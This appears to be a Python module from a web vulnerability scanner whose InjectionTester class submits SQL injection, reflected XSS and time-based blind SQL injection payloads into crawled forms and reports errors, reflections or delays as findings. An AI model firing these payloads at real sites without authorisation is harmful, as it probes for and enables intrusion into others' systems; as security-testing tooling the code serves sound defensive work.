import time
import logging
from typing import Optional, List, Dict
from urllib.parse import urljoin

from scanner.vulnerability import Vulnerability

logger = logging.getLogger(__name__)


class InjectionTester:
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "\" OR \"1\"=\"1\" -- ",
        "' OR 1=1 #",
        "admin' --",
        "' UNION SELECT NULL--",
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "\"><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        "<body onload=alert('XSS')>",
    ]

    BLIND_PAYLOADS = [
        "'; IF (1=1) WAITFOR DELAY '0:0:5'--",     # MSSQL
        "'; SELECT pg_sleep(5)--",                 # PostgreSQL
        "'; SELECT SLEEP(5) #",                    # MySQL
        "' OR 1=1 AND SLEEP(5)--",                 # MySQL variant
        "' OR 1=1 AND BENCHMARK(5000000,MD5(1))#"  # MySQL heavy
    ]

    def __init__(self, crawler):
        self.crawler = crawler  # нужен для _fetch

    async def _fetch(self, url, method='get', **kwargs):
        return await self.crawler._fetch(url, method=method, **kwargs)

    async def test_sqli(self, url: str, form: Dict) -> Optional[Vulnerability]:
        for payload in self.SQLI_PAYLOADS:
            data = {}
            for inp in form['inputs']:
                if inp['type'] in ('submit', 'button'):
                    continue
                data[inp['name']] = payload

            try:
                if form['method'] == 'post':
                    resp = await self._fetch(form['action'], method='post', data=data)
                else:
                    resp = await self._fetch(form['action'], method='get', params=data)

                content = resp.lower()
                sql_errors = [
                    "you have an error in your sql syntax",
                    "unclosed quotation mark",
                    "odbc drivers error",
                    "sqlite3::",
                    "postgresql",
                    "microsoft ole db",
                    "mysql_fetch",
                    "syntax error",
                ]
                if any(err in content for err in sql_errors):
                    return Vulnerability(
                        url=url,
                        vuln_type="SQL Injection",
                        detail=f"Form action: {form['action']}, parameter '{inp['name']}' – payload: {payload}",
                        evidence=resp[:400]
                    )
            except Exception as e:
                logger.debug(f"Error during SQLi test: {e}")
                continue
        return None

    async def test_xss(self, url: str, form: Dict) -> Optional[Vulnerability]:
        for payload in self.XSS_PAYLOADS:
            data = {}
            for inp in form['inputs']:
                if inp['type'] in ('submit', 'button'):
                    continue
                data[inp['name']] = payload

            try:
                if form['method'] == 'post':
                    resp = await self._fetch(form['action'], method='post', data=data)
                else:
                    resp = await self._fetch(form['action'], method='get', params=data)

                if payload in resp:
                    return Vulnerability(
                        url=url,
                        vuln_type="Reflected XSS",
                        detail=f"Form action: {form['action']}, parameter '{inp['name']}' – payload: {payload}",
                        evidence=resp[:400]
                    )
            except:
                continue
        return None

    async def test_blind_sqli(self, url: str, form: Dict) -> Optional[Vulnerability]:
        for payload in self.BLIND_PAYLOADS:
            data = {}
            for inp in form['inputs']:
                if inp['type'] in ('submit', 'button'):
                    continue
                data[inp['name']] = payload

            try:
                start = time.time()
                if form['method'] == 'post':
                    await self._fetch(form['action'], method='post', data=data)
                else:
                    await self._fetch(form['action'], method='get', params=data)
                elapsed = time.time() - start

                # Задержка > 4 секунд указывает на time-based инъекцию
                if elapsed > 4.5:
                    return Vulnerability(
                        url=url,
                        vuln_type="Blind SQL Injection (Time-based)",
                        detail=f"Form action: {form['action']}, time delay {elapsed:.2f}s with payload: {payload}",
                        evidence=f"Response time: {elapsed:.2f}s"
                    )
            except:
                continue
        return None
